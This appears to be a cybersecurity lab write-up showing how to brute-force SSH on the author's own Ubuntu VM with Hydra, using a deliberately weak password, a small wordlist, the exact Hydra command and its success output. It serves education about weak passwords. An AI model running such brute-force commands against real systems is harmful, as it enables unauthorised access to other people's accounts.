# SSH Brute Force Lab with Hydra  
This document describes the full step-by-step process of building and executing an ethical hacking lab where Hydra is used to perform an SSH password brute-force attack on an Ubuntu target machine.

---

## 1. Lab Environment Setup

### Attacker Machine
- Kali Linux (latest version)
- Hydra installed (`sudo apt install hydra`)
- Host-Only or NAT Network

### Target Machine
- Ubuntu Server/Desktop
- SSH server enabled (`sudo apt install openssh-server`)
- A low-privileged user created: labuser
- Intentionally weak password used: qwerty123

---

## 2. Creating the Lab User on Ubuntu

On Ubuntu machine:
sudo adduser labuser

Set password:  
qwerty123

Verify user:
id labuser

---

## 3. Getting Ubuntu Host-Only IP (Target)

On Ubuntu:
ip a

Example IP:  
192.168.255.3

---

## 4. Manual SSH Login Test

From Kali:
ssh labuser@192.168.255.3

If password qwerty123 works, SSH configuration is correct.

---

## 5. Creating a Wordlist in Kali
cd ~
nano passlist.txt

Add passwords:
123456
password
admin123
qwerty
qwerty123
labuser123
ubuntu2024

Save: CTRL+O → Enter → CTRL+X

---

## 6. Running Hydra Brute Force Attack
hydra -l labuser -P passlist.txt ssh://192.168.255.3

Expected successful result:
[22][ssh] host: 192.168.255.3   login: labuser   password: qwerty123

---

## 7. Results and Explanation

- Hydra tested all passwords from the wordlist.
- It found the correct password qwerty123.
- The attack demonstrates why weak passwords are dangerous.
- This lab is only for ethical hacking and cybersecurity education.

---

## 8. Skills Demonstrated

- Network scanning
- SSH authentication testing
- Password brute forcing with Hydra
- Linux system administration
- Ethical hacking methodology
- Documentation for cybersecurity projects

---

## 9. Next Steps (Future Work)

- Add fail2ban to Ubuntu and test lockout behavior  
- Try a bigger wordlist (rockyou.txt)  
- Run Hydra over different protocols: FTP, RDP, HTTP login forms  
- Automate everything using Bash or Python
